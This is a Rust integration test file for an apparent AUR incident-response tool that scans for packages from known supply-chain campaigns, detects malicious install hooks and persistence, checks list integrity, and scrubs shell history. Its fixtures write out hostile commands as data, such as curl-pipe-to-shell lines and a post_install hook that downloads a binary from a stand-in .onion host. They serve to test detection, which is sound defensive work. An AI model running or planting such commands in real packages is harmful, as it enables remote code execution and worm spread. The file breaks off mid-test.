use serde_json::Value;
use std::fs;
use std::process::Command;
use tempfile::tempdir;

fn binary() -> &'static str {
    env!("CARGO_BIN_EXE_aur-response")
}

fn fixture_host() -> (tempfile::TempDir, std::path::PathBuf, std::path::PathBuf) {
    let dir = tempdir().unwrap();
    let logs = dir.path().join("logs");
    let local = dir.path().join("local");
    fs::create_dir_all(&logs).unwrap();
    fs::create_dir_all(local.join("beef-1-1")).unwrap();
    fs::write(
        logs.join("pacman.log"),
        concat!(
            "[2026-06-10T08:00:00-0600] [ALPM] installed beef (1-1)\n",
            "[2026-06-11T08:00:00-0600] [ALPM] upgraded beef (1-1 -> 2-1)\n",
            "[2026-06-12T08:00:00-0600] [ALPM] installed bee (1-1)\n"
        ),
    )
    .unwrap();
    fs::write(
        local.join("beef-1-1/desc"),
        "%NAME%\nbeef\n\n%INSTALLDATE%\n1781100000\n",
    )
    .unwrap();
    let foreign = dir.path().join("foreign.txt");
    fs::write(&foreign, "beef\nbee\n").unwrap();
    (dir, logs, foreign)
}

#[test]
fn native_timeline_preserves_exact_package_matching_and_repeat_count() {
    let (home, logs, foreign) = fixture_host();
    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_TEST_PACMAN_LOG_DIR", logs)
        .env("AUR_TEST_FOREIGN_LIST", foreign)
        .env(
            "AUR_TEST_LIST_FILE",
            format!(
                "{}/tests/fixtures/lists/atomic-arch-pkgs.txt",
                env!("CARGO_MANIFEST_DIR")
            ),
        )
        .args(["scan", "timeline", "atomic-arch", "--local", "--json"])
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(1));
    let stdout = String::from_utf8(output.stdout).unwrap();
    assert!(stdout.contains("[FOUND] 2 timeline hit(s)"));
    assert!(stdout.contains("[REPEAT] beef"));
    assert!(!stdout.contains("installed bee ("));
    let start = stdout.find('{').unwrap();
    let json: Value = serde_json::from_str(&stdout[start..]).unwrap();
    assert_eq!(json["atomic_arch_timeline_hits"], 2);
    assert_eq!(json["atomic_arch_timeline_repeat_updates"], 1);
}

#[test]
fn native_window_distinguishes_known_and_unknown_foreign_packages() {
    let (home, logs, foreign) = fixture_host();
    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_TEST_PACMAN_LOG_DIR", logs)
        .env("AUR_TEST_FOREIGN_LIST", foreign)
        .env(
            "AUR_TEST_LIST_FILE",
            format!(
                "{}/tests/fixtures/lists/atomic-arch-pkgs.txt",
                env!("CARGO_MANIFEST_DIR")
            ),
        )
        .args(["scan", "aur-window", "--local"])
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(1));
    let stdout = String::from_utf8(output.stdout).unwrap();
    assert!(stdout.contains("[CRITICAL] beef"));
    assert!(stdout.contains("[REVIEW] bee"));
}

#[test]
fn native_remove_verify_and_dry_run_never_mutate() {
    let (home, _, foreign) = fixture_host();
    let verify = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_TEST_FOREIGN_LIST", &foreign)
        .env(
            "AUR_TEST_LIST_FILE",
            format!(
                "{}/tests/fixtures/lists/atomic-arch-pkgs.txt",
                env!("CARGO_MANIFEST_DIR")
            ),
        )
        .args(["recovery", "remove-packages", "--local", "--verify"])
        .output()
        .unwrap();
    assert_eq!(verify.status.code(), Some(1));
    assert!(String::from_utf8(verify.stdout)
        .unwrap()
        .contains("VERIFY FAILED"));

    let dry_run = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_TEST_FOREIGN_LIST", foreign)
        .env(
            "AUR_TEST_LIST_FILE",
            format!(
                "{}/tests/fixtures/lists/atomic-arch-pkgs.txt",
                env!("CARGO_MANIFEST_DIR")
            ),
        )
        .args(["recovery", "remove-packages", "--local", "--dry-run"])
        .output()
        .unwrap();
    assert_eq!(dry_run.status.code(), Some(0));
    assert!(String::from_utf8(dry_run.stdout)
        .unwrap()
        .contains("not executing"));
}

#[test]
fn remove_packages_refuses_noninteractive_execution_without_force() {
    let home = tempdir().unwrap();
    let foreign = home.path().join("foreign.txt");
    fs::write(&foreign, "explicit-package\n").unwrap();

    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_TEST_FOREIGN_LIST", foreign)
        .args(["recovery", "remove-packages", "explicit-package"])
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(4));
    assert!(String::from_utf8(output.stderr)
        .unwrap()
        .contains("non-interactive terminal requires --force"));
}

#[test]
fn native_artifact_scan_detects_cache_and_persistence_iocs() {
    let home = tempdir().unwrap();
    let npm = home.path().join(".npm/cache/js-digest");
    let systemd = home.path().join(".config/systemd/user");
    let local = home.path().join("pacman-local");
    fs::create_dir_all(&npm).unwrap();
    fs::create_dir_all(&systemd).unwrap();
    fs::create_dir_all(&local).unwrap();
    fs::write(npm.join("package.json"), "{}").unwrap();
    fs::write(
        systemd.join("gh-token-monitor.service"),
        "[Service]\nExecStart=/home/user/.local/bin/gh-token-monitor.sh\n",
    )
    .unwrap();
    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_PACMAN_LOCAL_DIR", local)
        .env("AUR_TEST_SYSTEMD_SYSTEM_DIR", home.path().join("systemd"))
        .env("AUR_TEST_CRON_ROOTS", home.path().join("cron"))
        .env("AUR_TEST_SKIP_LD_PRELOAD", "1")
        .args(["scan", "malware-artifacts", "--quick"])
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(1));
    let stdout = String::from_utf8(output.stdout).unwrap();
    assert!(stdout.contains("js-digest"));
    assert!(stdout.contains("gh-token-monitor"));
}

#[test]
fn native_hardening_and_audit_inventory_preserve_exit_policy() {
    let home = tempdir().unwrap();
    fs::create_dir_all(home.path().join(".config/yay")).unwrap();
    fs::create_dir_all(home.path().join(".ssh")).unwrap();
    fs::write(
        home.path().join(".config/yay/config.json"),
        r#"{"noconfirm": true}"#,
    )
    .unwrap();
    fs::write(home.path().join(".ssh/id_ed25519"), "private").unwrap();
    let hardening = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .args(["scan", "hardening"])
        .output()
        .unwrap();
    assert_eq!(hardening.status.code(), Some(2));
    assert!(String::from_utf8(hardening.stdout)
        .unwrap()
        .contains("skip PKGBUILD review"));

    let audit = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .arg("audit")
        .output()
        .unwrap();
    assert_eq!(audit.status.code(), Some(2));
    assert!(String::from_utf8(audit.stdout)
        .unwrap()
        .contains("private key"));
}

#[test]
fn recover_refuses_noninteractive_input() {
    let home = tempdir().unwrap();
    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .args(["--local", "--recover"])
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(4));
    assert!(String::from_utf8(output.stderr)
        .unwrap()
        .contains("interactive terminal"));
}

#[test]
fn remote_lists_use_source_parsers_and_update_cache_with_delta() {
    let home = tempdir().unwrap();
    let list = home.path().join("atomic-list.txt");
    let arch = home.path().join("arch.html");
    let cscs = home.path().join("cscs.sh");
    let extra = home.path().join("extra.txt");
    let foreign = home.path().join("foreign.txt");
    let logs = home.path().join("logs");
    fs::create_dir_all(&logs).unwrap();
    fs::write(&list, "beef\nremoved-package\n").unwrap();
    fs::write(&arch, "<p>beef</p>\n<script>bad()</script>\n").unwrap();
    fs::write(
        &cscs,
        "noise\nINFECTED_PKGS=(\ncscs-package\ninvalid package\n)\nafter\n",
    )
    .unwrap();
    fs::write(&extra, "extra-package\nnot a package\n").unwrap();
    fs::write(&foreign, "").unwrap();

    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_ATOMIC_ARCH_LIST_FILE", &list)
        .env("AUR_LIST_URL_ARCH", format!("file://{}", arch.display()))
        .env("AUR_LIST_URL_CSCS", format!("file://{}", cscs.display()))
        .env("AUR_LIST_URL_EXTRA", format!("file://{}", extra.display()))
        .env("AUR_TEST_FOREIGN_LIST", foreign)
        .env("AUR_TEST_PACMAN_LOG_DIR", logs)
        .args(["scan", "packages", "atomic-arch", "--json"])
        .output()
        .unwrap();

    assert_eq!(
        output.status.code(),
        Some(0),
        "stdout:\n{}\nstderr:\n{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert_eq!(
        fs::read_to_string(&list).unwrap(),
        "beef\ncscs-package\nextra-package\n"
    );
    assert_eq!(
        fs::read_to_string(list.with_extension("previous.txt")).unwrap(),
        "beef\nremoved-package\n"
    );
    let stdout = String::from_utf8(output.stdout).unwrap();
    let json: Value = serde_json::from_str(&stdout[stdout.find('{').unwrap()..]).unwrap();
    assert_eq!(json["list_added"], 2);
    assert_eq!(json["list_removed"], 1);
}

#[test]
fn remote_refresh_preserves_verified_bundled_baseline() {
    let home = tempdir().unwrap();
    let data = home.path().join("data");
    let lists = data.join("lists");
    let upstream = std::path::Path::new(env!("CARGO_MANIFEST_DIR"));
    fs::create_dir_all(&lists).unwrap();
    fs::copy(
        upstream.join("data/integrity.toml"),
        data.join("integrity.toml"),
    )
    .unwrap();
    let bundled = lists.join("atomic-arch-pkgs.txt");
    fs::copy(upstream.join("data/lists/atomic-arch-pkgs.txt"), &bundled).unwrap();
    let empty = home.path().join("empty.txt");
    let extra = home.path().join("extra.txt");
    let foreign = home.path().join("foreign.txt");
    let logs = home.path().join("logs");
    fs::create_dir_all(&logs).unwrap();
    fs::write(&empty, "").unwrap();
    fs::write(&extra, "remote-only-package\n").unwrap();
    fs::write(&foreign, "").unwrap();

    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_LIST_URL_ARCH", format!("file://{}", empty.display()))
        .env("AUR_LIST_URL_CSCS", format!("file://{}", empty.display()))
        .env("AUR_LIST_URL_EXTRA", format!("file://{}", extra.display()))
        .env("AUR_TEST_FOREIGN_LIST", foreign)
        .env("AUR_TEST_PACMAN_LOG_DIR", logs)
        .args(["scan", "packages", "atomic-arch"])
        .output()
        .unwrap();

    assert_eq!(
        output.status.code(),
        Some(0),
        "stdout:\n{}\nstderr:\n{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    let refreshed = fs::read_to_string(bundled).unwrap();
    assert!(refreshed.lines().any(|line| line == "123pan-bin"));
    assert!(refreshed.lines().any(|line| line == "remote-only-package"));
}

#[test]
fn remote_refresh_rejects_tampered_bundled_baseline_without_overwrite() {
    let home = tempdir().unwrap();
    let data = home.path().join("data");
    let lists = data.join("lists");
    let upstream = std::path::Path::new(env!("CARGO_MANIFEST_DIR"));
    fs::create_dir_all(&lists).unwrap();
    fs::copy(
        upstream.join("data/integrity.toml"),
        data.join("integrity.toml"),
    )
    .unwrap();
    let bundled = lists.join("atomic-arch-pkgs.txt");
    let tampered = "attacker-controlled-package\n";
    fs::write(&bundled, tampered).unwrap();
    let empty = home.path().join("empty.txt");
    let extra = home.path().join("extra.txt");
    let foreign = home.path().join("foreign.txt");
    let logs = home.path().join("logs");
    fs::create_dir_all(&logs).unwrap();
    fs::write(&empty, "").unwrap();
    fs::write(&extra, "remote-only-package\n").unwrap();
    fs::write(&foreign, "").unwrap();

    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_LIST_URL_ARCH", format!("file://{}", empty.display()))
        .env("AUR_LIST_URL_CSCS", format!("file://{}", empty.display()))
        .env("AUR_LIST_URL_EXTRA", format!("file://{}", extra.display()))
        .env("AUR_TEST_FOREIGN_LIST", foreign)
        .env("AUR_TEST_PACMAN_LOG_DIR", logs)
        .args(["scan", "packages", "atomic-arch"])
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(3));
    assert!(String::from_utf8(output.stdout)
        .unwrap()
        .contains("atomic-arch list integrity mismatch"));
    assert_eq!(fs::read_to_string(bundled).unwrap(), tampered);
}

#[test]
fn local_scan_rejects_tampered_canonical_campaign_list() {
    let home = tempdir().unwrap();
    let data = home.path().join("data");
    let lists = data.join("lists");
    let upstream = std::path::Path::new(env!("CARGO_MANIFEST_DIR"));
    fs::create_dir_all(&lists).unwrap();
    fs::copy(
        upstream.join("data/integrity.toml"),
        data.join("integrity.toml"),
    )
    .unwrap();
    let bundled = lists.join("xsnow-worm-pkgs.txt");
    fs::write(&bundled, "tampered-xsnow\n").unwrap();
    let foreign = home.path().join("foreign.txt");
    fs::write(&foreign, "").unwrap();

    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_TEST_FOREIGN_LIST", foreign)
        .args(["scan", "packages", "xsnow-worm", "--local"])
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(3));
    assert!(String::from_utf8(output.stdout)
        .unwrap()
        .contains("xsnow-worm list integrity mismatch"));
    assert_eq!(fs::read_to_string(bundled).unwrap(), "tampered-xsnow\n");
}

#[test]
fn scrub_history_applies_redaction_and_creates_recovery_backup() {
    let home = tempdir().unwrap();
    let history = home.path().join(".bash_history");
    let original = "echo safe\nexport API_KEY=secret\nprintf done\n";
    fs::write(&history, original).unwrap();

    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .args(["recovery", "scrub-history", "--all-shells"])
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(0));
    assert_eq!(
        fs::read_to_string(&history).unwrap(),
        "echo safe\nprintf done\n"
    );
    let backups = fs::read_dir(home.path())
        .unwrap()
        .filter_map(Result::ok)
        .filter(|entry| {
            entry
                .file_name()
                .to_string_lossy()
                .starts_with(".bash_history.bak.")
        })
        .collect::<Vec<_>>();
    assert_eq!(backups.len(), 1);
    assert_eq!(fs::read_to_string(backups[0].path()).unwrap(), original);
}

#[test]
fn scrub_history_refuses_oversized_hostile_input_without_mutation() {
    let home = tempdir().unwrap();
    let history = home.path().join(".bash_history");
    let original = vec![b'x'; 1_048_577];
    fs::write(&history, &original).unwrap();

    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .args(["recovery", "scrub-history", "--all-shells"])
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(3));
    assert!(String::from_utf8(output.stderr)
        .unwrap()
        .contains("exceeds inspection limit"));
    assert_eq!(fs::read(&history).unwrap(), original);
    assert_eq!(
        fs::read_dir(home.path())
            .unwrap()
            .filter_map(Result::ok)
            .filter(|entry| entry
                .file_name()
                .to_string_lossy()
                .starts_with(".bash_history.bak."))
            .count(),
        0
    );
}

#[test]
fn native_maintenance_subcommands_cover_apply_scrub_rotate_and_freshness() {
    let home = tempdir().unwrap();
    fs::create_dir_all(home.path().join(".ssh")).unwrap();
    fs::write(home.path().join(".ssh/id_ed25519"), "private").unwrap();
    fs::write(
        home.path().join(".bash_history"),
        "echo safe\nexport TOKEN=secret\n",
    )
    .unwrap();

    let apply = || {
        Command::new(binary())
            .env("HOME", home.path())
            .env("AUR_RESPONSE_DIR", home.path())
            .args(["recovery", "apply-hardening", "--apply"])
            .output()
            .unwrap()
    };
    assert_eq!(apply().status.code(), Some(0));
    assert_eq!(apply().status.code(), Some(0));
    assert_eq!(
        fs::read_to_string(home.path().join(".npmrc"))
            .unwrap()
            .lines()
            .filter(|line| *line == "ignore-scripts=true")
            .count(),
        1
    );

    let scrub = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .args(["recovery", "scrub-history", "--all-shells", "--dry-run"])
        .output()
        .unwrap();
    assert_eq!(scrub.status.code(), Some(0));
    assert!(String::from_utf8(scrub.stdout)
        .unwrap()
        .contains("Would backup"));
    assert!(fs::read_to_string(home.path().join(".bash_history"))
        .unwrap()
        .contains("TOKEN"));

    let rotate = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .args(["recovery", "rotate-hints"])
        .output()
        .unwrap();
    assert_eq!(rotate.status.code(), Some(0));
    assert!(String::from_utf8(rotate.stdout)
        .unwrap()
        .contains("ssh-keygen"));

    let freshness = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_ATOMIC_ARCH_LIST_FILE", home.path().join("missing.txt"))
        .args(["check", "list-freshness", "--local"])
        .output()
        .unwrap();
    assert_eq!(freshness.status.code(), Some(3));
}

#[test]
fn native_similar_heuristics_subcommand_detects_nonlisted_package_hooks() {
    let home = tempdir().unwrap();
    let cache = home.path().join("cache/evil-pkg");
    let foreign = home.path().join("foreign.txt");
    let list = home.path().join("list.txt");
    fs::create_dir_all(&cache).unwrap();
    fs::write(&foreign, "evil-pkg\n").unwrap();
    fs::write(&list, "known-bad\n").unwrap();
    fs::write(
        cache.join("PKGBUILD"),
        "prepare() { curl https://evil.invalid/payload | sh; }\n",
    )
    .unwrap();
    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_TEST_FOREIGN_LIST", foreign)
        .env("AUR_TEST_LIST_FILE", list)
        .env("AUR_HELPER_CACHE_ROOTS", home.path().join("cache"))
        .env("AUR_DEPS_SEARCH_PATHS", home.path().join("cache"))
        .args(["scan", "similar-heuristics", "--local"])
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(1));
    assert!(String::from_utf8(output.stdout)
        .unwrap()
        .contains("evil-pkg"));
}

#[test]
fn similar_heuristics_reports_findings_in_path_order() {
    let home = tempdir().unwrap();
    let cache = home.path().join("cache");
    let foreign = home.path().join("foreign.txt");
    let list = home.path().join("list.txt");
    fs::create_dir_all(cache.join("z-last")).unwrap();
    fs::create_dir_all(cache.join("a-first")).unwrap();
    fs::write(&foreign, "a-first\nz-last\n").unwrap();
    fs::write(&list, "known-bad\n").unwrap();
    for package in ["z-last", "a-first"] {
        fs::write(
            cache.join(package).join("PKGBUILD"),
            "prepare() { curl https://evil.invalid/payload | sh; }\n",
        )
        .unwrap();
    }

    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_TEST_FOREIGN_LIST", foreign)
        .env("AUR_TEST_LIST_FILE", list)
        .env("AUR_HELPER_CACHE_ROOTS", &cache)
        .env("AUR_DEPS_SEARCH_PATHS", cache)
        .args(["scan", "similar-heuristics", "--local"])
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(1));
    let stdout = String::from_utf8(output.stdout).unwrap();
    let first = stdout.find("a-first/PKGBUILD").unwrap();
    let last = stdout.find("z-last/PKGBUILD").unwrap();
    assert!(first < last, "findings were not sorted by path:\n{stdout}");
}

#[test]
fn new_campaign_timelines_match_packages_only_inside_incident_windows() {
    let home = tempdir().unwrap();
    let logs = home.path().join("logs");
    fs::create_dir_all(&logs).unwrap();
    fs::write(
        logs.join("pacman.log"),
        concat!(
            "[2026-07-29T08:00:00-0600] [ALPM] installed openconnect-sso (1-1)\n",
            "[2026-07-30T08:00:00-0600] [ALPM] upgraded openconnect-sso (1-1 -> 2-1)\n",
            "[2026-05-27T08:00:00-0600] [ALPM] installed browsh-bin (1-1)\n",
            "[2026-05-28T08:00:00-0600] [ALPM] upgraded browsh-bin (1-1 -> 2-1)\n",
            "[2026-05-28T09:00:00-0600] [ALPM] installed plex-media-player (1-1)\n",
        ),
    )
    .unwrap();
    let openconnect = home.path().join("openconnect.txt");
    let browsh = home.path().join("browsh.txt");
    let shai = home.path().join("shai.txt");
    fs::write(&openconnect, "openconnect-sso\n").unwrap();
    fs::write(&browsh, "browsh-bin\n").unwrap();
    fs::write(&shai, "plex-media-player\n").unwrap();

    for (campaign, list_env, list, counter, expected_package, expected_hits) in [
        (
            "openconnect-sso",
            "AUR_OPENCONNECT_SSO_LIST_FILE",
            &openconnect,
            "openconnect_sso_timeline_hits",
            "openconnect-sso",
            2,
        ),
        (
            "browsh-linux-utils",
            "AUR_BROWSH_LINUX_UTILS_LIST_FILE",
            &browsh,
            "browsh_linux_utils_timeline_hits",
            "browsh-bin",
            1,
        ),
        (
            "shai-hulud",
            "AUR_SHAI_HULUD_LIST_FILE",
            &shai,
            "shai_hulud_timeline_hits",
            "plex-media-player",
            1,
        ),
    ] {
        let output = Command::new(binary())
            .env("HOME", home.path())
            .env("AUR_RESPONSE_DIR", home.path())
            .env("AUR_TEST_PACMAN_LOG_DIR", &logs)
            .env(list_env, list)
            .args(["scan", "timeline", campaign, "--local", "--json"])
            .output()
            .unwrap();
        assert_eq!(output.status.code(), Some(2));
        let stdout = String::from_utf8(output.stdout).unwrap();
        assert!(stdout.contains(expected_package));
        let json: Value = serde_json::from_str(&stdout[stdout.find('{').unwrap()..]).unwrap();
        assert_eq!(json[counter], expected_hits);
    }
}

#[test]
fn artifact_scan_detects_linux_utils_embedded_elf_payload() {
    let home = tempdir().unwrap();
    let payload = home
        .path()
        .join("cache/browsh-bin/node_modules/linux-utils/index.mjs");
    let local = home.path().join("pacman-local");
    fs::create_dir_all(payload.parent().unwrap()).unwrap();
    fs::create_dir_all(&local).unwrap();
    fs::write(&payload, b"javascript wrapper\n\x7fELFpayload").unwrap();

    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_DEPS_SEARCH_PATHS", home.path().join("cache"))
        .env("AUR_PACMAN_LOCAL_DIR", local)
        .env("AUR_TEST_SYSTEMD_SYSTEM_DIR", home.path().join("systemd"))
        .env("AUR_TEST_CRON_ROOTS", home.path().join("cron"))
        .env("AUR_TEST_SKIP_LD_PRELOAD", "1")
        .args(["scan", "malware-artifacts", "--quick"])
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(1));
    assert!(String::from_utf8(output.stdout)
        .unwrap()
        .contains("linux-utils/index.mjs"));
}

#[test]
fn artifact_scan_does_not_flag_benign_characteristic_size_alone() {
    let home = tempdir().unwrap();
    let candidate = home.path().join("cache/benign/formatter");
    let local = home.path().join("pacman-local");
    fs::create_dir_all(candidate.parent().unwrap()).unwrap();
    fs::create_dir_all(&local).unwrap();
    fs::write(&candidate, vec![0_u8; 43_640]).unwrap();

    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_DEPS_SEARCH_PATHS", home.path().join("cache"))
        .env("AUR_PACMAN_LOCAL_DIR", local)
        .env("AUR_TEST_SYSTEMD_SYSTEM_DIR", home.path().join("systemd"))
        .env("AUR_TEST_CRON_ROOTS", home.path().join("cron"))
        .env("AUR_TEST_SKIP_LD_PRELOAD", "1")
        .args(["scan", "malware-artifacts", "--quick", "--json"])
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(0));
    let stdout = String::from_utf8(output.stdout).unwrap();
    let json: Value = serde_json::from_str(&stdout[stdout.find('{').unwrap()..]).unwrap();
    assert_eq!(json["artifact_critical"], 0);
}

#[test]
fn similar_heuristics_scan_checks_install_hooks_for_privileged_validators() {
    let home = tempdir().unwrap();
    let cache = home.path().join("cache/openconnect-sso");
    fs::create_dir_all(&cache).unwrap();
    fs::write(
        cache.join(".INSTALL"),
        "post_install() { sudo ./validator; }\n",
    )
    .unwrap();

    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_HELPER_CACHE_ROOTS", home.path().join("cache"))
        .env("AUR_DEPS_SEARCH_PATHS", home.path().join("cache"))
        .args(["scan", "similar-heuristics", "--local"])
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(1));
    assert!(String::from_utf8(output.stdout)
        .unwrap()
        .contains("openconnect-sso/.INSTALL"));
}

#[test]
fn xsnow_timeline_uses_august_incident_window() {
    let home = tempdir().unwrap();
    let logs = home.path().join("logs");
    fs::create_dir_all(&logs).unwrap();
    fs::write(
        logs.join("pacman.log"),
        concat!(
            "[2026-08-23T20:00:00-0600] [ALPM] upgraded xsnow (3.7.0-1 -> 3.7.0-2)\n",
            "[2026-08-22T20:00:00-0600] [ALPM] installed xsnow-bin (3.7.0-1)\n",
        ),
    )
    .unwrap();
    let list = home.path().join("xsnow.txt");
    fs::write(&list, "xsnow\nxsnow-bin\n").unwrap();

    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_TEST_PACMAN_LOG_DIR", logs)
        .env("AUR_XSNOW_WORM_LIST_FILE", list)
        .args(["scan", "timeline", "xsnow-worm", "--local", "--json"])
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(2));
    let stdout = String::from_utf8(output.stdout).unwrap();
    assert!(stdout.contains("xsnow (3.7.0-1 -> 3.7.0-2)"));
    assert!(!stdout.contains("xsnow-bin (3.7.0-1)"));
    let json: Value = serde_json::from_str(&stdout[stdout.find('{').unwrap()..]).unwrap();
    assert_eq!(json["xsnow_worm_timeline_hits"], 1);
}

#[test]
fn similar_heuristics_detects_xsnow_hidden_install_script() {
    let home = tempdir().unwrap();
    let cache = home.path().join("cache/xsnow");
    fs::create_dir_all(&cache).unwrap();
    fs::write(
        cache.join(".xsnow.install"),
        "post_install() { curl -o /usr/local/bin/systemmanager http://example.onion/x; git push aur.archlinux.org; }\n",
    )
    .unwrap();

    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_HELPER_CACHE_ROOTS", home.path().join("cache"))
        .env("AUR_DEPS_SEARCH_PATHS", home.path().join("cache"))
        .args(["scan", "similar-heuristics", "--local"])
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(1));
    assert!(String::from_utf8(output.stdout)
        .unwrap()
        .contains("xsnow/.xsnow.install"));
}

#[test]
fn oversized_hostile_script_marks_coverage_incomplete() {
    let home = tempdir().unwrap();
    let cache = home.path().join("cache/package");
    fs::create_dir_all(&cache).unwrap();
    fs::write(cache.join("PKGBUILD"), vec![b'x'; 1_048_577]).unwrap();

    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_HELPER_CACHE_ROOTS", home.path().join("cache"))
        .args(["scan", "similar-heuristics", "--local", "--json"])
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(3));
    let stdout = String::from_utf8(output.stdout).unwrap();
    let json: Value = serde_json::from_str(&stdout[stdout.find('{').unwrap()..]).unwrap();
    assert_eq!(json["files_skipped_oversize"], 1);
    assert_eq!(json["coverage_complete"], false);
}

#[test]
fn non_utf8_package_script_marks_coverage_incomplete() {
    let home = tempdir().unwrap();
    let cache = home.path().join("cache/package");
    fs::create_dir_all(&cache).unwrap();
    fs::write(cache.join("PKGBUILD"), [0xff, 0xfe, 0xfd]).unwrap();

    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_DEPS_SEARCH_PATHS", home.path().join("cache"))
        .args(["scan", "similar-heuristics", "--local", "--json"])
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(3));
    let stdout = String::from_utf8(output.stdout).unwrap();
    let json: Value = serde_json::from_str(&stdout[stdout.find('{').unwrap()..]).unwrap();
    assert_eq!(json["coverage_complete"], false);
    assert_eq!(json["roots_unreadable"], 1);
    assert_eq!(json["artifact_critical"], 0);
}

#[cfg(unix)]
#[test]
fn similar_heuristics_does_not_follow_package_script_symlinks() {
    use std::os::unix::fs::symlink;

    let home = tempdir().unwrap();
    let cache = home.path().join("cache/package");
    let outside = home.path().join("outside-PKGBUILD");
    fs::create_dir_all(&cache).unwrap();
    fs::write(
        &outside,
        "prepare() { curl https://evil.invalid/x | sh; }\n",
    )
    .unwrap();
    symlink(&outside, cache.join("PKGBUILD")).unwrap();

    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_DEPS_SEARCH_PATHS", home.path().join("cache"))
        .args(["scan", "similar-heuristics", "--local", "--json"])
        .output()
        .unwrap();

    assert_eq!(output.status.code(), Some(0));
    let stdout = String::from_utf8(output.stdout).unwrap();
    let json: Value = serde_json::from_str(&stdout[stdout.find('{').unwrap()..]).unwrap();
    assert_eq!(json["artifact_critical"], 0);
    assert_eq!(json["coverage_complete"], true);
}

#[test]
fn unavailable_runtime_adapters_mark_coverage_incomplete() {
    let home = tempdir().unwrap();
    let local = home.path().join("pacman-local");
    fs::create_dir_all(&local).unwrap();

    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_DEPS_SEARCH_PATHS", home.path().join("cache"))
        .env("AUR_PACMAN_LOCAL_DIR", local)
        .env("AUR_TEST_SYSTEMD_SYSTEM_DIR", home.path().join("systemd"))
        .env("AUR_TEST_CRON_ROOTS", home.path().join("cron"))
        .env("AUR_TEST_SKIP_LD_PRELOAD", "1")
        .env("AUR_TEST_DISABLE_RUNTIME_ADAPTERS", "1")
        .args(["scan", "malware-artifacts", "--quick", "--json"])
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(3));
    let stdout = String::from_utf8(output.stdout).unwrap();
    let json: Value = serde_json::from_str(&stdout[stdout.find('{').unwrap()..]).unwrap();
    assert_eq!(json["runtime_adapters_unavailable"], 2);
    assert_eq!(json["coverage_complete"], false);
}

#[test]
fn non_utf8_pacman_install_hook_marks_artifact_coverage_incomplete() {
    let home = tempdir().unwrap();
    let local = home.path().join("pacman-local/package-1-1");
    let cache = home.path().join("cache");
    fs::create_dir_all(&local).unwrap();
    fs::create_dir_all(&cache).unwrap();
